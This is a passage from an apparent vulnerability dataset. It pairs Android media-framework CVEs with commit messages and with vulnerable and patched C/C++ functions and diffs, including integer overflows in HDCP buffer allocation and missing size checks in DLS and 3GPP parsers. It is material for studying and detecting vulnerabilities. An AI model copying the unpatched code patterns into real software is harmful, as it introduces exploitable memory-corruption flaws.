        "commit_text": " When processing 3GPP metadata, a subtraction operation may underflow and lead to a rather large linear byteswap operation in the subsequent framedata decoding code. Bound the 'size' value to prevent this from occurring.  Bug: 20923261 (cherry picked from commit 9458e715d391ee8fe455fc31f07ff35ce12e0531) ",
        "func_before": "status_t MPEG4Extractor::parse3GPPMetaData(off64_t offset, size_t size, int depth) {\n    if (size < 4 || size == SIZE_MAX) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t *buffer = new (std::nothrow) uint8_t[size + 1];\n    if (buffer == NULL) {\n        return ERROR_MALFORMED;\n    }\n    if (mDataSource->readAt(\n                offset, buffer, size) != (ssize_t)size) {\n        delete[] buffer;\n        buffer = NULL;\n\n        return ERROR_IO;\n    }\n\n    uint32_t metadataKey = 0;\n    switch (mPath[depth]) {\n        case FOURCC('t', 'i', 't', 'l'):\n        {\n            metadataKey = kKeyTitle;\n            break;\n        }\n        case FOURCC('p', 'e', 'r', 'f'):\n        {\n            metadataKey = kKeyArtist;\n            break;\n        }\n        case FOURCC('a', 'u', 't', 'h'):\n        {\n            metadataKey = kKeyWriter;\n            break;\n        }\n        case FOURCC('g', 'n', 'r', 'e'):\n        {\n            metadataKey = kKeyGenre;\n            break;\n        }\n        case FOURCC('a', 'l', 'b', 'm'):\n        {\n            if (buffer[size - 1] != '\\0') {\n              char tmp[4];\n              sprintf(tmp, \"%u\", buffer[size - 1]);\n\n              mFileMetaData->setCString(kKeyCDTrackNumber, tmp);\n            }\n\n            metadataKey = kKeyAlbum;\n            break;\n        }\n        case FOURCC('y', 'r', 'r', 'c'):\n        {\n            char tmp[5];\n            uint16_t year = U16_AT(&buffer[4]);\n\n            if (year < 10000) {\n                sprintf(tmp, \"%u\", year);\n\n                mFileMetaData->setCString(kKeyYear, tmp);\n            }\n            break;\n        }\n\n        default:\n            break;\n    }\n\n    if (metadataKey > 0) {\n        bool isUTF8 = true; // Common case\n        char16_t *framedata = NULL;\n        int len16 = 0; // Number of UTF-16 characters\n\n        // smallest possible valid UTF-16 string w BOM: 0xfe 0xff 0x00 0x00\n        if (size - 6 >= 4) {\n            len16 = ((size - 6) / 2) - 1; // don't include 0x0000 terminator\n            framedata = (char16_t *)(buffer + 6);\n            if (0xfffe == *framedata) {\n                // endianness marker (BOM) doesn't match host endianness\n                for (int i = 0; i < len16; i++) {\n                    framedata[i] = bswap_16(framedata[i]);\n                }\n                // BOM is now swapped to 0xfeff, we will execute next block too\n            }\n\n            if (0xfeff == *framedata) {\n                // Remove the BOM\n                framedata++;\n                len16--;\n                isUTF8 = false;\n            }\n            // else normal non-zero-length UTF-8 string\n            // we can't handle UTF-16 without BOM as there is no other\n            // indication of encoding.\n        }\n\n        if (isUTF8) {\n            buffer[size] = 0;\n            mFileMetaData->setCString(metadataKey, (const char *)buffer + 6);\n        } else {\n            // Convert from UTF-16 string to UTF-8 string.\n            String8 tmpUTF8str(framedata, len16);\n            mFileMetaData->setCString(metadataKey, tmpUTF8str.string());\n        }\n    }\n\n    delete[] buffer;\n    buffer = NULL;\n\n    return OK;\n}",
        "func": "status_t MPEG4Extractor::parse3GPPMetaData(off64_t offset, size_t size, int depth) {\n    if (size < 4 || size == SIZE_MAX) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t *buffer = new (std::nothrow) uint8_t[size + 1];\n    if (buffer == NULL) {\n        return ERROR_MALFORMED;\n    }\n    if (mDataSource->readAt(\n                offset, buffer, size) != (ssize_t)size) {\n        delete[] buffer;\n        buffer = NULL;\n\n        return ERROR_IO;\n    }\n\n    uint32_t metadataKey = 0;\n    switch (mPath[depth]) {\n        case FOURCC('t', 'i', 't', 'l'):\n        {\n            metadataKey = kKeyTitle;\n            break;\n        }\n        case FOURCC('p', 'e', 'r', 'f'):\n        {\n            metadataKey = kKeyArtist;\n            break;\n        }\n        case FOURCC('a', 'u', 't', 'h'):\n        {\n            metadataKey = kKeyWriter;\n            break;\n        }\n        case FOURCC('g', 'n', 'r', 'e'):\n        {\n            metadataKey = kKeyGenre;\n            break;\n        }\n        case FOURCC('a', 'l', 'b', 'm'):\n        {\n            if (buffer[size - 1] != '\\0') {\n              char tmp[4];\n              sprintf(tmp, \"%u\", buffer[size - 1]);\n\n              mFileMetaData->setCString(kKeyCDTrackNumber, tmp);\n            }\n\n            metadataKey = kKeyAlbum;\n            break;\n        }\n        case FOURCC('y', 'r', 'r', 'c'):\n        {\n            char tmp[5];\n            uint16_t year = U16_AT(&buffer[4]);\n\n            if (year < 10000) {\n                sprintf(tmp, \"%u\", year);\n\n                mFileMetaData->setCString(kKeyYear, tmp);\n            }\n            break;\n        }\n\n        default:\n            break;\n    }\n\n    if (metadataKey > 0) {\n        bool isUTF8 = true; // Common case\n        char16_t *framedata = NULL;\n        int len16 = 0; // Number of UTF-16 characters\n\n        // smallest possible valid UTF-16 string w BOM: 0xfe 0xff 0x00 0x00\n        if (size < 6) {\n            return ERROR_MALFORMED;\n        }\n\n        if (size - 6 >= 4) {\n            len16 = ((size - 6) / 2) - 1; // don't include 0x0000 terminator\n            framedata = (char16_t *)(buffer + 6);\n            if (0xfffe == *framedata) {\n                // endianness marker (BOM) doesn't match host endianness\n                for (int i = 0; i < len16; i++) {\n                    framedata[i] = bswap_16(framedata[i]);\n                }\n                // BOM is now swapped to 0xfeff, we will execute next block too\n            }\n\n            if (0xfeff == *framedata) {\n                // Remove the BOM\n                framedata++;\n                len16--;\n                isUTF8 = false;\n            }\n            // else normal non-zero-length UTF-8 string\n            // we can't handle UTF-16 without BOM as there is no other\n            // indication of encoding.\n        }\n\n        if (isUTF8) {\n            buffer[size] = 0;\n            mFileMetaData->setCString(metadataKey, (const char *)buffer + 6);\n        } else {\n            // Convert from UTF-16 string to UTF-8 string.\n            String8 tmpUTF8str(framedata, len16);\n            mFileMetaData->setCString(metadataKey, tmpUTF8str.string());\n        }\n    }\n\n    delete[] buffer;\n    buffer = NULL;\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -72,6 +72,10 @@\n         int len16 = 0; // Number of UTF-16 characters\n \n         // smallest possible valid UTF-16 string w BOM: 0xfe 0xff 0x00 0x00\n+        if (size < 6) {\n+            return ERROR_MALFORMED;\n+        }\n+\n         if (size - 6 >= 4) {\n             len16 = ((size - 6) / 2) - 1; // don't include 0x0000 terminator\n             framedata = (char16_t *)(buffer + 6);",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "        if (size < 6) {",
                "            return ERROR_MALFORMED;",
                "        }",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3834",
        "func_name": "android/BnHDCP::onTransact",
        "description": "Multiple integer overflows in the BnHDCP::onTransact function in media/libmedia/IHDCP.cpp in libstagefright in Android before 5.1.1 LMY48I allow attackers to execute arbitrary code via a crafted application that uses HDCP encryption, leading to a heap-based buffer overflow, aka internal bug 20222489.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/c82e31a7039a03dca7b37c65b7890ba5c1e18ced",
        "commit_title": "HDCP: buffer over flow check -- DO NOT MERGE",
        "commit_text": " bug: 20222489 (cherry picked from commit 532cd7b86a5fdc7b9a30a45d8ae2d16ef7660a72) ",
        "func_before": "status_t BnHDCP::onTransact(\n        uint32_t code, const Parcel &data, Parcel *reply, uint32_t flags) {\n    switch (code) {\n        case HDCP_SET_OBSERVER:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<IHDCPObserver> observer =\n                interface_cast<IHDCPObserver>(data.readStrongBinder());\n\n            reply->writeInt32(setObserver(observer));\n            return OK;\n        }\n\n        case HDCP_INIT_ASYNC:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            const char *host = data.readCString();\n            unsigned port = data.readInt32();\n\n            reply->writeInt32(initAsync(host, port));\n            return OK;\n        }\n\n        case HDCP_SHUTDOWN_ASYNC:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(shutdownAsync());\n            return OK;\n        }\n\n        case HDCP_GET_CAPS:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(getCaps());\n            return OK;\n        }\n\n        case HDCP_ENCRYPT:\n        {\n            size_t size = data.readInt32();\n\n            void *inData = malloc(2 * size);\n            void *outData = (uint8_t *)inData + size;\n\n            data.read(inData, size);\n\n            uint32_t streamCTR = data.readInt32();\n            uint64_t inputCTR;\n            status_t err = encrypt(inData, size, streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n            if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n            }\n\n            free(inData);\n            inData = outData = NULL;\n\n            return OK;\n        }\n\n        case HDCP_ENCRYPT_NATIVE:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<GraphicBuffer> graphicBuffer = new GraphicBuffer();\n            data.read(*graphicBuffer);\n            size_t offset = data.readInt32();\n            size_t size = data.readInt32();\n            uint32_t streamCTR = data.readInt32();\n            void *outData = malloc(size);\n            uint64_t inputCTR;\n\n            status_t err = encryptNative(graphicBuffer, offset, size,\n                                         streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n            if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n            }\n\n            free(outData);\n            outData = NULL;\n\n            return OK;\n        }\n\n        case HDCP_DECRYPT:\n        {\n            size_t size = data.readInt32();\n\n            void *inData = malloc(2 * size);\n            void *outData = (uint8_t *)inData + size;\n\n            data.read(inData, size);\n\n            uint32_t streamCTR = data.readInt32();\n            uint64_t inputCTR = data.readInt64();\n            status_t err = decrypt(inData, size, streamCTR, inputCTR, outData);\n\n            reply->writeInt32(err);\n\n            if (err == OK) {\n                reply->write(outData, size);\n            }\n\n            free(inData);\n            inData = outData = NULL;\n\n            return OK;\n        }\n\n        default:\n            return BBinder::onTransact(code, data, reply, flags);\n    }\n}",
        "func": "status_t BnHDCP::onTransact(\n        uint32_t code, const Parcel &data, Parcel *reply, uint32_t flags) {\n    switch (code) {\n        case HDCP_SET_OBSERVER:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<IHDCPObserver> observer =\n                interface_cast<IHDCPObserver>(data.readStrongBinder());\n\n            reply->writeInt32(setObserver(observer));\n            return OK;\n        }\n\n        case HDCP_INIT_ASYNC:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            const char *host = data.readCString();\n            unsigned port = data.readInt32();\n\n            reply->writeInt32(initAsync(host, port));\n            return OK;\n        }\n\n        case HDCP_SHUTDOWN_ASYNC:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(shutdownAsync());\n            return OK;\n        }\n\n        case HDCP_GET_CAPS:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            reply->writeInt32(getCaps());\n            return OK;\n        }\n\n        case HDCP_ENCRYPT:\n        {\n            size_t size = data.readInt32();\n            size_t bufSize = 2 * size;\n\n            // watch out for overflow\n            void *inData = NULL;\n            if (bufSize > size) {\n                inData = malloc(bufSize);\n            }\n\n            if (inData == NULL) {\n                reply->writeInt32(ERROR_OUT_OF_RANGE);\n                return OK;\n            }\n\n            void *outData = (uint8_t *)inData + size;\n\n            data.read(inData, size);\n\n            uint32_t streamCTR = data.readInt32();\n            uint64_t inputCTR;\n            status_t err = encrypt(inData, size, streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n            if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n            }\n\n            free(inData);\n            inData = outData = NULL;\n\n            return OK;\n        }\n\n        case HDCP_ENCRYPT_NATIVE:\n        {\n            CHECK_INTERFACE(IHDCP, data, reply);\n\n            sp<GraphicBuffer> graphicBuffer = new GraphicBuffer();\n            data.read(*graphicBuffer);\n            size_t offset = data.readInt32();\n            size_t size = data.readInt32();\n            uint32_t streamCTR = data.readInt32();\n            void *outData = malloc(size);\n            uint64_t inputCTR;\n\n            status_t err = encryptNative(graphicBuffer, offset, size,\n                                         streamCTR, &inputCTR, outData);\n\n            reply->writeInt32(err);\n\n            if (err == OK) {\n                reply->writeInt64(inputCTR);\n                reply->write(outData, size);\n            }\n\n            free(outData);\n            outData = NULL;\n\n            return OK;\n        }\n\n        case HDCP_DECRYPT:\n        {\n            size_t size = data.readInt32();\n            size_t bufSize = 2 * size;\n\n            // watch out for overflow\n            void *inData = NULL;\n            if (bufSize > size) {\n                inData = malloc(bufSize);\n            }\n\n            if (inData == NULL) {\n                reply->writeInt32(ERROR_OUT_OF_RANGE);\n                return OK;\n            }\n\n            void *outData = (uint8_t *)inData + size;\n\n            data.read(inData, size);\n\n            uint32_t streamCTR = data.readInt32();\n            uint64_t inputCTR = data.readInt64();\n            status_t err = decrypt(inData, size, streamCTR, inputCTR, outData);\n\n            reply->writeInt32(err);\n\n            if (err == OK) {\n                reply->write(outData, size);\n            }\n\n            free(inData);\n            inData = outData = NULL;\n\n            return OK;\n        }\n\n        default:\n            return BBinder::onTransact(code, data, reply, flags);\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -42,8 +42,19 @@\n         case HDCP_ENCRYPT:\n         {\n             size_t size = data.readInt32();\n+            size_t bufSize = 2 * size;\n \n-            void *inData = malloc(2 * size);\n+            // watch out for overflow\n+            void *inData = NULL;\n+            if (bufSize > size) {\n+                inData = malloc(bufSize);\n+            }\n+\n+            if (inData == NULL) {\n+                reply->writeInt32(ERROR_OUT_OF_RANGE);\n+                return OK;\n+            }\n+\n             void *outData = (uint8_t *)inData + size;\n \n             data.read(inData, size);\n@@ -96,8 +107,19 @@\n         case HDCP_DECRYPT:\n         {\n             size_t size = data.readInt32();\n+            size_t bufSize = 2 * size;\n \n-            void *inData = malloc(2 * size);\n+            // watch out for overflow\n+            void *inData = NULL;\n+            if (bufSize > size) {\n+                inData = malloc(bufSize);\n+            }\n+\n+            if (inData == NULL) {\n+                reply->writeInt32(ERROR_OUT_OF_RANGE);\n+                return OK;\n+            }\n+\n             void *outData = (uint8_t *)inData + size;\n \n             data.read(inData, size);",
        "diff_line_info": {
            "deleted_lines": [
                "            void *inData = malloc(2 * size);",
                "            void *inData = malloc(2 * size);"
            ],
            "added_lines": [
                "            size_t bufSize = 2 * size;",
                "            // watch out for overflow",
                "            void *inData = NULL;",
                "            if (bufSize > size) {",
                "                inData = malloc(bufSize);",
                "            }",
                "",
                "            if (inData == NULL) {",
                "                reply->writeInt32(ERROR_OUT_OF_RANGE);",
                "                return OK;",
                "            }",
                "",
                "            size_t bufSize = 2 * size;",
                "            // watch out for overflow",
                "            void *inData = NULL;",
                "            if (bufSize > size) {",
                "                inData = malloc(bufSize);",
                "            }",
                "",
                "            if (inData == NULL) {",
                "                reply->writeInt32(ERROR_OUT_OF_RANGE);",
                "                return OK;",
                "            }",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3836",
        "func_name": "android/Parse_wave",
        "description": "The Parse_wave function in arm-wt-22k/lib_src/eas_mdls.c in the Sonivox DLS-to-EAS converter in Android before 5.1.1 LMY48I does not reject a negative value for a certain size field, which allows remote attackers to execute arbitrary code or cause a denial of service (buffer overflow) via crafted XMF data, aka internal bug 21132860.",
        "git_url": "https://android.googlesource.com/platform/external/sonivox/+/e999f077f6ef59d20282f1e04786816a31fb8be6",
        "commit_title": "DLS parser: fix wave pool size check.",
        "commit_text": " Bug: 21132860. (cherry picked from commit 2d7f8e1be2241e48458f5d3cab5e90be2b07c699) ",
        "func_before": "static EAS_RESULT Parse_wave (SDLS_SYNTHESIZER_DATA *pDLSData, EAS_I32 pos, EAS_U16 waveIndex)\n{\n    EAS_RESULT result;\n    EAS_U32 temp;\n    EAS_I32 size;\n    EAS_I32 endChunk;\n    EAS_I32 chunkPos;\n    EAS_I32 wsmpPos = 0;\n    EAS_I32 fmtPos = 0;\n    EAS_I32 dataPos = 0;\n    EAS_I32 dataSize = 0;\n    S_WSMP_DATA *p;\n    void *pSample;\n    S_WSMP_DATA wsmp;\n\n    /* seek to start of chunk */\n    chunkPos = pos + 12;\n    if ((result = EAS_HWFileSeek(pDLSData->hwInstData, pDLSData->fileHandle, pos)) != EAS_SUCCESS)\n        return result;\n\n    /* get the chunk type */\n    if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n        return result;\n\n    /* make sure it is a wave chunk */\n    if (temp != CHUNK_WAVE)\n    {\n        { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Offset in ptbl does not point to wave chunk\\n\"); */ }\n        return EAS_ERROR_FILE_FORMAT;\n    }\n\n    /* read to end of chunk */\n    pos = chunkPos;\n    endChunk = pos + size;\n    while (pos < endChunk)\n    {\n        chunkPos = pos;\n\n        /* get the chunk type */\n        if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n            return result;\n\n        /* parse useful chunks */\n        switch (temp)\n        {\n            case CHUNK_WSMP:\n                wsmpPos = chunkPos + 8;\n                break;\n\n            case CHUNK_FMT:\n                fmtPos = chunkPos + 8;\n                break;\n\n            case CHUNK_DATA:\n                dataPos = chunkPos + 8;\n                dataSize = size;\n                break;\n\n            default:\n                break;\n        }\n    }\n\n    // limit to reasonable size\n    if (dataSize > MAX_DLS_WAVE_SIZE)\n    {\n        return EAS_ERROR_SOUND_LIBRARY;\n    }\n\n    /* for first pass, use temporary variable */\n    if (pDLSData->pDLS == NULL)\n        p = &wsmp;\n    else\n        p = &pDLSData->wsmpData[waveIndex];\n\n    /* set the defaults */\n    p->fineTune = 0;\n    p->unityNote = 60;\n    p->gain = 0;\n    p->loopStart = 0;\n    p->loopLength = 0;\n\n    /* must have a fmt chunk */\n    if (!fmtPos)\n    {\n        { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no fmt chunk\\n\"); */ }\n        return EAS_ERROR_UNRECOGNIZED_FORMAT;\n    }\n\n    /* must have a data chunk */\n    if (!dataPos)\n    {\n        { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no data chunk\\n\"); */ }\n        return EAS_ERROR_UNRECOGNIZED_FORMAT;\n    }\n\n    /* parse the wsmp chunk */\n    if (wsmpPos)\n    {\n        if ((result = Parse_wsmp(pDLSData, wsmpPos, p)) != EAS_SUCCESS)\n            return result;\n    }\n\n    /* parse the fmt chunk */\n    if ((result = Parse_fmt(pDLSData, fmtPos, p)) != EAS_SUCCESS)\n        return result;\n\n    /* calculate the size of the wavetable needed. We need only half\n     * the memory for 16-bit samples when in 8-bit mode, and we need\n     * double the memory for 8-bit samples in 16-bit mode. For\n     * unlooped samples, we may use ADPCM. If so, we need only 1/4\n     * the memory.\n     *\n     * We also need to add one for looped samples to allow for\n     * the first sample to be copied to the end of the loop.\n     */\n\n    /* use ADPCM encode for unlooped 16-bit samples if ADPCM is enabled */\n    /*lint -e{506} -e{774} groundwork for future version to support 8 & 16 bit */\n    if (bitDepth == 8)\n    {\n        if (p->bitsPerSample == 8)\n            size = dataSize;\n        else\n            /*lint -e{704} use shift for performance */\n            size = dataSize >> 1;\n        if (p->loopLength)\n            size++;\n    }\n\n    else\n    {\n        if (p->bitsPerSample == 16)\n            size = dataSize;\n        else\n            /*lint -e{703} use shift for performance */\n            size = dataSize << 1;\n        if (p->loopLength)\n            size += 2;\n    }\n\n    /* for first pass, add size to wave pool size and return */\n    if (pDLSData->pDLS == NULL)\n    {\n        pDLSData->wavePoolSize += (EAS_U32) size;\n        return EAS_SUCCESS;\n    }\n\n    /* allocate memory and read in the sample data */\n    pSample = pDLSData->pDLS->pDLSSamples + pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleOffsets[waveIndex] = pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleLen[waveIndex] = (EAS_U32) size;\n    pDLSData->wavePoolOffset += (EAS_U32) size;\n    if (pDLSData->wavePoolOffset > pDLSData->wavePoolSize)\n    {\n        { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Wave pool exceeded allocation\\n\"); */ }\n        return EAS_ERROR_SOUND_LIBRARY;\n    }\n\n    if ((result = Parse_data(pDLSData, dataPos, dataSize, p, pSample)) != EAS_SUCCESS)\n        return result;\n\n    return EAS_SUCCESS;\n}",
        "func": "static EAS_RESULT Parse_wave (SDLS_SYNTHESIZER_DATA *pDLSData, EAS_I32 pos, EAS_U16 waveIndex)\n{\n    EAS_RESULT result;\n    EAS_U32 temp;\n    EAS_I32 size;\n    EAS_I32 endChunk;\n    EAS_I32 chunkPos;\n    EAS_I32 wsmpPos = 0;\n    EAS_I32 fmtPos = 0;\n    EAS_I32 dataPos = 0;\n    EAS_I32 dataSize = 0;\n    S_WSMP_DATA *p;\n    void *pSample;\n    S_WSMP_DATA wsmp;\n\n    /* seek to start of chunk */\n    chunkPos = pos + 12;\n    if ((result = EAS_HWFileSeek(pDLSData->hwInstData, pDLSData->fileHandle, pos)) != EAS_SUCCESS)\n        return result;\n\n    /* get the chunk type */\n    if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n        return result;\n\n    /* make sure it is a wave chunk */\n    if (temp != CHUNK_WAVE)\n    {\n        { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Offset in ptbl does not point to wave chunk\\n\"); */ }\n        return EAS_ERROR_FILE_FORMAT;\n    }\n\n    /* read to end of chunk */\n    pos = chunkPos;\n    endChunk = pos + size;\n    while (pos < endChunk)\n    {\n        chunkPos = pos;\n\n        /* get the chunk type */\n        if ((result = NextChunk(pDLSData, &pos, &temp, &size)) != EAS_SUCCESS)\n            return result;\n\n        /* parse useful chunks */\n        switch (temp)\n        {\n            case CHUNK_WSMP:\n                wsmpPos = chunkPos + 8;\n                break;\n\n            case CHUNK_FMT:\n                fmtPos = chunkPos + 8;\n                break;\n\n            case CHUNK_DATA:\n                dataPos = chunkPos + 8;\n                dataSize = size;\n                break;\n\n            default:\n                break;\n        }\n    }\n\n    // limit to reasonable size\n    if (dataSize < 0 || dataSize > MAX_DLS_WAVE_SIZE)\n    {\n        return EAS_ERROR_SOUND_LIBRARY;\n    }\n\n    /* for first pass, use temporary variable */\n    if (pDLSData->pDLS == NULL)\n        p = &wsmp;\n    else\n        p = &pDLSData->wsmpData[waveIndex];\n\n    /* set the defaults */\n    p->fineTune = 0;\n    p->unityNote = 60;\n    p->gain = 0;\n    p->loopStart = 0;\n    p->loopLength = 0;\n\n    /* must have a fmt chunk */\n    if (!fmtPos)\n    {\n        { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no fmt chunk\\n\"); */ }\n        return EAS_ERROR_UNRECOGNIZED_FORMAT;\n    }\n\n    /* must have a data chunk */\n    if (!dataPos)\n    {\n        { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"DLS wave chunk has no data chunk\\n\"); */ }\n        return EAS_ERROR_UNRECOGNIZED_FORMAT;\n    }\n\n    /* parse the wsmp chunk */\n    if (wsmpPos)\n    {\n        if ((result = Parse_wsmp(pDLSData, wsmpPos, p)) != EAS_SUCCESS)\n            return result;\n    }\n\n    /* parse the fmt chunk */\n    if ((result = Parse_fmt(pDLSData, fmtPos, p)) != EAS_SUCCESS)\n        return result;\n\n    /* calculate the size of the wavetable needed. We need only half\n     * the memory for 16-bit samples when in 8-bit mode, and we need\n     * double the memory for 8-bit samples in 16-bit mode. For\n     * unlooped samples, we may use ADPCM. If so, we need only 1/4\n     * the memory.\n     *\n     * We also need to add one for looped samples to allow for\n     * the first sample to be copied to the end of the loop.\n     */\n\n    /* use ADPCM encode for unlooped 16-bit samples if ADPCM is enabled */\n    /*lint -e{506} -e{774} groundwork for future version to support 8 & 16 bit */\n    if (bitDepth == 8)\n    {\n        if (p->bitsPerSample == 8)\n            size = dataSize;\n        else\n            /*lint -e{704} use shift for performance */\n            size = dataSize >> 1;\n        if (p->loopLength)\n            size++;\n    }\n\n    else\n    {\n        if (p->bitsPerSample == 16)\n            size = dataSize;\n        else\n            /*lint -e{703} use shift for performance */\n            size = dataSize << 1;\n        if (p->loopLength)\n            size += 2;\n    }\n\n    /* for first pass, add size to wave pool size and return */\n    if (pDLSData->pDLS == NULL)\n    {\n        pDLSData->wavePoolSize += (EAS_U32) size;\n        return EAS_SUCCESS;\n    }\n\n    /* allocate memory and read in the sample data */\n    pSample = pDLSData->pDLS->pDLSSamples + pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleOffsets[waveIndex] = pDLSData->wavePoolOffset;\n    pDLSData->pDLS->pDLSSampleLen[waveIndex] = (EAS_U32) size;\n    pDLSData->wavePoolOffset += (EAS_U32) size;\n    if (pDLSData->wavePoolOffset > pDLSData->wavePoolSize)\n    {\n        { /* dpp: EAS_ReportEx(_EAS_SEVERITY_ERROR, \"Wave pool exceeded allocation\\n\"); */ }\n        return EAS_ERROR_SOUND_LIBRARY;\n    }\n\n    if ((result = Parse_data(pDLSData, dataPos, dataSize, p, pSample)) != EAS_SUCCESS)\n        return result;\n\n    return EAS_SUCCESS;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -62,7 +62,7 @@\n     }\n \n     // limit to reasonable size\n-    if (dataSize > MAX_DLS_WAVE_SIZE)\n+    if (dataSize < 0 || dataSize > MAX_DLS_WAVE_SIZE)\n     {\n         return EAS_ERROR_SOUND_LIBRARY;\n     }",
        "diff_line_info": {
            "deleted_lines": [
                "    if (dataSize > MAX_DLS_WAVE_SIZE)"
            ],
            "added_lines": [
                "    if (dataSize < 0 || dataSize > MAX_DLS_WAVE_SIZE)"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3861",
        "func_name": "android/MetaData::typed_data::setData",
        "description": "Multiple integer overflows in the addVorbisCodecInfo function in matroska/MatroskaExtractor.cpp in libstagefright in mediaserver in Android before 5.1.1 LMY48M allow remote attackers to cause a denial of service (device inoperability) via crafted Matroska data, aka internal bug 21296336.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/304ef91624e12661e7e35c2c0c235da84a73e9c0",
        "commit_title": "Guard against codecinfo overflow",
        "commit_text": " Bug: 21296336 ",
        "func_before": "void MetaData::typed_data::setData(\n        uint32_t type, const void *data, size_t size) {\n    clear();\n\n    mType = type;\n    allocateStorage(size);\n    memcpy(storage(), data, size);\n}",
        "func": "void MetaData::typed_data::setData(\n        uint32_t type, const void *data, size_t size) {\n    clear();\n\n    mType = type;\n    allocateStorage(size);\n    void *dst = storage();\n    if (!dst) {\n        ALOGE(\"Couldn't allocate %zu bytes for item\", size);\n        return;\n    }\n    memcpy(dst, data, size);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,5 +4,10 @@\n \n     mType = type;\n     allocateStorage(size);\n-    memcpy(storage(), data, size);\n+    void *dst = storage();\n+    if (!dst) {\n+        ALOGE(\"Couldn't allocate %zu bytes for item\", size);\n+        return;\n+    }\n+    memcpy(dst, data, size);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "    memcpy(storage(), data, size);"
            ],
            "added_lines": [
                "    void *dst = storage();",
                "    if (!dst) {",
                "        ALOGE(\"Couldn't allocate %zu bytes for item\", size);",
                "        return;",
                "    }",
                "    memcpy(dst, data, size);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3861",
        "func_name": "android/addVorbisCodecInfo",
        "description": "Multiple integer overflows in the addVorbisCodecInfo function in matroska/MatroskaExtractor.cpp in libstagefright in mediaserver in Android before 5.1.1 LMY48M allow remote attackers to cause a denial of service (device inoperability) via crafted Matroska data, aka internal bug 21296336.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/304ef91624e12661e7e35c2c0c235da84a73e9c0",
        "commit_title": "Guard against codecinfo overflow",
        "commit_text": " Bug: 21296336 ",
        "func_before": "status_t addVorbisCodecInfo(\n        const sp<MetaData> &meta,\n        const void *_codecPrivate, size_t codecPrivateSize) {\n    // hexdump(_codecPrivate, codecPrivateSize);\n\n    if (codecPrivateSize < 1) {\n        return ERROR_MALFORMED;\n    }\n\n    const uint8_t *codecPrivate = (const uint8_t *)_codecPrivate;\n\n    if (codecPrivate[0] != 0x02) {\n        return ERROR_MALFORMED;\n    }\n\n    // codecInfo starts with two lengths, len1 and len2, that are\n    // \"Xiph-style-lacing encoded\"...\n\n    size_t offset = 1;\n    size_t len1 = 0;\n    while (offset < codecPrivateSize && codecPrivate[offset] == 0xff) {\n        len1 += 0xff;\n        ++offset;\n    }\n    if (offset >= codecPrivateSize) {\n        return ERROR_MALFORMED;\n    }\n    len1 += codecPrivate[offset++];\n\n    size_t len2 = 0;\n    while (offset < codecPrivateSize && codecPrivate[offset] == 0xff) {\n        len2 += 0xff;\n        ++offset;\n    }\n    if (offset >= codecPrivateSize) {\n        return ERROR_MALFORMED;\n    }\n    len2 += codecPrivate[offset++];\n\n    if (codecPrivateSize < offset + len1 + len2) {\n        return ERROR_MALFORMED;\n    }\n\n    if (codecPrivate[offset] != 0x01) {\n        return ERROR_MALFORMED;\n    }\n    meta->setData(kKeyVorbisInfo, 0, &codecPrivate[offset], len1);\n\n    offset += len1;\n    if (codecPrivate[offset] != 0x03) {\n        return ERROR_MALFORMED;\n    }\n\n    offset += len2;\n    if (codecPrivate[offset] != 0x05) {\n        return ERROR_MALFORMED;\n    }\n\n    meta->setData(\n            kKeyVorbisBooks, 0, &codecPrivate[offset],\n            codecPrivateSize - offset);\n\n    return OK;\n}",
